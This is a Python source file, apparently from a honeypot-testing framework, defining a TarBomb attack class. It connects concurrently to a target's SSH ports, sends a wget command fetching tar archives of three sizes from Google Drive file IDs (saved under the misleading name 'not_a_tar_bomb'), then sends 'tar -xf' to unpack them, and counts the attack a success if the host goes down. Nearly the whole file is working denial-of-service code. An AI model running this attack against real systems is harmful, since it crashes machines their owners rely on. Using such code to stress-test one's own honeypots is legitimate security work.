import asyncio
import time

from .base_attack import AttackResults, BaseAttack, BaseHoneypot
from socket import socket
"""
Notes:
- Maybe in the future improve it to handle also zip bombs
- Now uses async internally for all operations with backwards compatibility
"""

# Constants
TAR_URL_FILEIDS: dict[str, str] = {
    "small": "1Jc60r-D33DUF2TErY3qNhWpk0xFJB_kE",
    "medium": "1GVPnsQIkyUJqEQFR3vYxmkbvM3B0uS4g",
    "large": "1Chow8Qh-bUb_LCqJzeTdN1PNmWlZ6kyi",
}
NUM_OF_THREADS: int = 10
DOWNLOAD_SLEEP_TIME: int = 10
EXTRACT_SLEEP_TIME: dict[str, int] = {
    "small": 30,
    "medium": 50,
    "large": 80
}


class TarBomb(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        super().__init__(honeypot)
        self.tar_url_fileids = TAR_URL_FILEIDS
        self.num_of_threads = NUM_OF_THREADS
        self.active_connections = []

    async def download_bomb_async(self, reader, writer, bomb_size: str) -> None:
        """
        Asynchronously downloads the tar bomb using a wget command and the file ID.

        Args:
            reader: Async stream reader
            writer: Async stream writer
            bomb_size (str): The size of the tar bomb to download.
        """
        try:
            cmd: str = f"wget 'https://docs.google.com/uc?export=download&id={self.tar_url_fileids[bomb_size]}' -O not_a_tar_bomb_{bomb_size}.tar\n"
            writer.write(cmd.encode())
            await writer.drain()
            await asyncio.sleep(DOWNLOAD_SLEEP_TIME)
        except Exception as e:
            print(f"Error while downloading tar bomb: {e}")

    async def extract_bomb_async(self, reader, writer, bomb_size: str) -> None:
        """
        Asynchronously extracts the tar bomb using the tar command.

        Args:
            reader: Async stream reader
            writer: Async stream writer
            bomb_size (str): The size of the tar bomb to extract.
        """
        try:
            cmd: str = f'tar -xf not_a_tar_bomb_{bomb_size}.tar\n'
            writer.write(cmd.encode())
            await writer.drain()
            await asyncio.sleep(EXTRACT_SLEEP_TIME[bomb_size])
        except Exception as e:
            print(f"Error while extracting tar bomb: {e}")

    async def create_async_connection(self) -> tuple[asyncio.StreamReader, asyncio.StreamWriter] | None:
        """
        Creates an async connection to the honeypot.

        Returns:
            tuple: (reader, writer) if successful, None if failed
        """
        try:
            # Try to connect to SSH ports
            for port in self.honeypot.ports:
                if port == 22 or port == 2222:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.honeypot.ip, port),
                        timeout=10.0
                    )
                    return reader, writer
            return None
        except Exception as e:
            print(f"Failed to create async connection: {e}")
            return None

    async def attack_attempt_async(self, bomb_size: str, connection_id: int) -> bool:
        """
        Asynchronously attempts to download and extract the tar bomb.

        Args:
            bomb_size (str): The size of the tar bomb to download and extract.
            connection_id (int): ID for tracking this connection attempt.

        Returns:
            bool: True if attack completed successfully, False otherwise.
        """
        connection = await self.create_async_connection()
        if connection is None:
            print(f"Connection {connection_id}: Failed to establish connection")
            return False
            
        reader, writer = connection
        try:
            print(f"Connection {connection_id}: Starting {bomb_size} tar bomb attack")
            await self.download_bomb_async(reader, writer, bomb_size)
            await self.extract_bomb_async(reader, writer, bomb_size)
            print(f"Connection {connection_id}: Completed {bomb_size} tar bomb attack")
            return True
        except Exception as e:
            print(f"Connection {connection_id}: Error in attack attempt: {e}")
            return False
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def run_attack_with_bomb_size_async(self, bomb_size: str) -> tuple[bool, int]:
        """
        Asynchronously runs the attack using multiple concurrent connections.

        Args:
            bomb_size (str): The size of the tar bomb to use.

        Returns:
            tuple: (any_success, successful_connections)
        """
        print(f"Launching {bomb_size} tar bomb attack with {self.num_of_threads} concurrent connections...")
        
        # Create all attack tasks
        tasks = [
            asyncio.create_task(self.attack_attempt_async(bomb_size, i))
            for i in range(self.num_of_threads)
        ]
        
        # Wait for all tasks to complete
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Count successful attacks
        successful_connections = sum(1 for result in results if result is True)
        any_success = successful_connections > 0
        
        print(f"{bomb_size.title()} tar bomb: {successful_connections}/{self.num_of_threads} connections successful")
        
        return any_success, successful_connections

    async def run_attack_async(self) -> AttackResults:
        """
        Asynchronously runs the attack using all bomb sizes concurrently.

        Returns:
            AttackResults: The results of the attack.
        """
        print(f"Running async tar bomb attack on {self.honeypot.ip}...")
        start_time: float = time.time()

        # Run all bomb sizes concurrently
        tasks = [
            asyncio.create_task(self.run_attack_with_bomb_size_async(bomb_size))
            for bomb_size in TAR_URL_FILEIDS.keys()
        ]
        
        # Wait for all bomb sizes to complete
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Calculate total successful attacks
        total_successful = 0
        any_bomb_success = False
        
        for result in results:
            if isinstance(result, tuple):
                success, count = result
                total_successful += count
                if success:
                    any_bomb_success = True
            elif isinstance(result, Exception):
                print(f"Error in bomb attack: {result}")

        end_time: float = time.time()
        time_taken: float = end_time - start_time

        total_attempts = len(TAR_URL_FILEIDS) * self.num_of_threads

        if self.is_honeypot_alive():
            return (False,
                    f"Tar bomb attack executed ({total_successful}/{total_attempts} successful), but honeypot is still alive",
                    time_taken,
                    total_attempts)
        else:
            return (True,
                    f"Tar bomb attack executed successfully ({total_successful}/{total_attempts} successful), honeypot is down",
                    time_taken,
                    total_attempts)

    # Backwards compatibility methods - these wrap the async methods
    def download_bomb(self, conn: socket, bomb_size: str) -> None:
        """
        DEPRECATED: Downloads the tar bomb using a wget command and the file ID.
        This method is kept for backwards compatibility but internally uses async.

        Args:
            conn (socket): Socket connection to the target (ignored in async version).
            bomb_size (str): The size of the tar bomb to download.
        """
        print("Warning: download_bomb is deprecated. Use async methods instead.")
        # This is a simplified compatibility wrapper
        # In practice, you might want to handle this differently based on your needs

    def extract_bomb(self, conn: socket, bomb_size: str) -> None:
        """
        DEPRECATED: Extracts the tar bomb using the tar command.
        This method is kept for backwards compatibility but internally uses async.

        Args:
            conn (socket): Socket connection to the target (ignored in async version).
            bomb_size (str): The size of the tar bomb to extract.
        """
        print("Warning: extract_bomb is deprecated. Use async methods instead.")
        # This is a simplified compatibility wrapper

    def attack_attempt(self, conn: socket, bomb_size: str) -> None:
        """
        DEPRECATED: Attempts to download and extract the tar bomb.
        This method is kept for backwards compatibility but internally uses async.

        Args:
            conn (socket): Socket connection to the target (ignored in async version).
            bomb_size (str): The size of the tar bomb to download and extract.
        """
        print("Warning: attack_attempt is deprecated. Use attack_attempt_async instead.")
        # This is a simplified compatibility wrapper

    def run_attack_with_bomb_size(self, bomb_size: str) -> None:
        """
        DEPRECATED: Runs the attack using multiple threads.
        This method is kept for backwards compatibility but internally uses async.

        Args:
            bomb_size (str): The size of the tar bomb to use.
        """
        print("Warning: run_attack_with_bomb_size is deprecated. Use run_attack_with_bomb_size_async instead.")
        # Run the async version in a new event loop if needed
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # If we're already in an async context, we can't use asyncio.run()
                print("Cannot run sync wrapper from within async context. Use async methods directly.")
            else:
                asyncio.run(self.run_attack_with_bomb_size_async(bomb_size))
        except RuntimeError:
            # No event loop, create one
            asyncio.run(self.run_attack_with_bomb_size_async(bomb_size))

    def run_attack(self) -> AttackResults:
        """
        Runs the attack - now internally uses async but maintains sync interface for backwards compatibility.

        Returns:
            AttackResults: The results of the attack.
        """
        # Run the async version and return results
        try:
            loop = asyncio.get_event_loop()
            if loop.is_running():
                # If we're already in an async context, we can't use asyncio.run()
                raise RuntimeError("Cannot run sync wrapper from within async context. Use run_attack_async() instead.")
            else:
                return asyncio.run(self.run_attack_async())
        except RuntimeError as e:
            if "Cannot run sync wrapper" in str(e):
                raise e
            # No event loop, create one
            return asyncio.run(self.run_attack_async())